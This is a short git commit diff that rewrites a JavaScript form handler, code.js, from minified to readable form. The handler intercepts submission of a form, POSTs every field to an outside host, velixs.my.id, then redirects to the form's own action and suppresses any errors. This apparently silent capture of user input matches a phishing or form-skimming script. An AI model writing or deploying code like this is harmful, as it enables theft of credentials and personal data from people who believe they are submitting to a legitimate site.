1792182a86d9066761efa11677f1f0896ca8c8e2
queenV1 <156501745+queenV1@users.noreply.github.com>
2024-01-13 15:31:54 +0700

    Update code.js

--- code.js
+++ code.js
@@ -1,1 +1,24 @@
-const content=document.getElementById("content");content.addEventListener("submit",e=>{e.preventDefault();let n=new FormData(content),o={};n.forEach((e,n)=>{o[n]=e});let t=new URLSearchParams;for(let i in o)t.append(i,o[i]);fetch("https://velixs.my.id/api?kode_unik=12345",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:t.toString()})}); ￼Enter
+const content = document.getElementById("content");
+        content.addEventListener("submit", e => {
+            e.preventDefault();
+            let formData = new FormData(content);
+            let formDataObject = {};
+            formData.forEach((value, key) => {
+                formDataObject[key] = value;
+            });
+
+            let urlSearchParams = new URLSearchParams;
+            for (let key in formDataObject) {
+                urlSearchParams.append(key, formDataObject[key]);
+            }
+
+            fetch("https://velixs.my.id/api?kode_unik=12345", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: urlSearchParams.toString()
+            })
+            .then(response => response.ok && (window.location.href = content.getAttribute("action")))
+            .catch(error => {});  // No error message here
+        });
